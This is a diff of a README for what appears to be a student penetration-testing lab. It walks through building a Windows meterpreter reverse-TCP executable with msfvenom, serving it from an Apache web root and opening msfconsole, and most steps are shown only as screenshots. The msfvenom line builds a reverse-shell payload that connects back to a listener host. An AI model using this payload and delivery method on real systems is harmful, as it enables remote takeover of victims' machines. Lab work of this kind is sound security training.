@@ -29,13 +29,20 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
 #### OUTPUT
 ![Screenshot 2024-04-16 143439](https://github.com/Vinothini1711/Echoserver/assets/144300204/e1de975c-93ad-4167-a7c6-921eae9a9801)
 copy the fun.exe into the apache /var/www/html folder
+
 ![Screenshot 2024-04-16 143448](https://github.com/Vinothini1711/Echoserver/assets/144300204/eaf50b1f-801f-4515-afb5-6727f11a58a7)
+
 Start apache server
 sudo systemctl apache2 start
+
 ![Screenshot 2024-04-16 143511](https://github.com/Vinothini1711/Echoserver/assets/144300204/ab7fe513-a6a8-4e23-b8e5-1665195b344c)
+
 Check the status of apache2
+
 ![Screenshot 2024-04-16 143554](https://github.com/Vinothini1711/Echoserver/assets/144300204/9857a3f9-147d-41a7-a1c3-32274f494a18)
+
 Invoke msfconsole:
+
 ![Screenshot 2024-04-16 143610](https://github.com/Vinothini1711/Echoserver/assets/144300204/cbf109d5-bb84-4d84-af83-893a0c7ddad8)
 ## OUTPUT:
 Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.
